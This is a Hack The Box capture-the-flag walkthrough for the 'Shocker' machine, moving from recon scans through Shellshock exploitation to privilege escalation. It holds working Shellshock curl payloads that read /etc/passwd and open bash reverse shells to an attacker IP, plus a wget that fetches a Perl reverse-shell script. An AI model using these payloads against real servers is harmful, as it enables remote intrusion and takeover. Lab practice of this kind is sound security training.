# Shocker Hack The Box Tips

# ${{\color{purple}Initial Recon}}\ $

``nmap -sC -sV -oA shocker 10.10.10.56``

![image](https://user-images.githubusercontent.com/123066149/226357310-160d9812-0522-4479-9126-c9dfb936d848.png)

``nmap --script vuln 10.10.10.56``

![image](https://user-images.githubusercontent.com/123066149/226357364-2f1a6ef5-cb76-45aa-9dbe-1aa2565ce426.png)

``nikto -host http://10.10.10.56``

![image](https://user-images.githubusercontent.com/123066149/226357618-4e8827c0-36ac-4262-8d96-6f39bb768a17.png)

# ${{\color{purple}Initial Foothold}}\ $

``dirb http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/CGIs.txt -t 50``

![image](https://user-images.githubusercontent.com/123066149/226358323-1477f05a-58f6-4cb4-a09b-0f501c1fab3c.png)

``gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 30 -x cgi,php,html``

![image](https://user-images.githubusercontent.com/123066149/226358774-9ff94040-b230-4b9f-80cd-4192b8cadbb0.png)

``gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x sh``

![image](https://user-images.githubusercontent.com/123066149/226358987-9f981b40-2e78-425f-b55c-8e6cc4501907.png)

# ${{\color{purple}Exploitation}}\ $

https://www.sevenlayers.com/index.php/125-exploiting-shellshock

``curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /usr/bin/id" http://10.10.10.56/cgi-bin/user.sh``

![image](https://user-images.githubusercontent.com/123066149/226359725-99a8e315-f5cd-4c97-a665-d35ee18b483c.png)

``curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /bin/cat /etc/passwd" http://10.10.10.56/cgi-bin/user.sh``

![image](https://user-images.githubusercontent.com/123066149/226359889-1dfca83c-36ec-414c-8a28-9d8e413639c8.png)

``curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.16.3/4444 0>&1' http://10.10.10.56/cgi-bin/user.sh``

![image](https://user-images.githubusercontent.com/123066149/226360049-1b28e5c0-6da6-45b4-b402-8f3cd40f2f6a.png)

``tcpdump -i tun0 icmp``

![image](https://user-images.githubusercontent.com/123066149/226360977-54c45416-dd99-4277-a907-282565f43809.png)

``() { :; }; /bin/bash -i >& /dev/tcp/10.10.16.3/8888 0>&1``

![image](https://user-images.githubusercontent.com/123066149/226362205-e35b0eb5-850a-43c9-8981-381bd14795b5.png)


# ${{\color{purple}Privilege Escalation}}\ $

``sudo -l``

![image](https://user-images.githubusercontent.com/123066149/226363790-6c615050-105d-452c-99fd-d788831cab73.png)

``wget http://10.10.16.3:80/perl_pentest_monkey.pl && chmod +x perl_pentest_monkey.pl``

![image](https://user-images.githubusercontent.com/123066149/226364007-ae3f7cf5-6268-44e3-8ee2-49e646b769cd.png)

![image](https://user-images.githubusercontent.com/123066149/226364266-decade33-b8d1-4b2a-a900-04efe2f7cd1e.png)

![image](https://user-images.githubusercontent.com/123066149/226364474-3b850292-695e-42c4-a7db-0081e34dc9bf.png)

# ${{\color{purple}Point of Improvement}}\ $

* Don't hesitate to use several extensions during the recon phase ``-x sh,pl``
* nmap is possible for the discovery part : ``nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=ls 10.10.10.56``
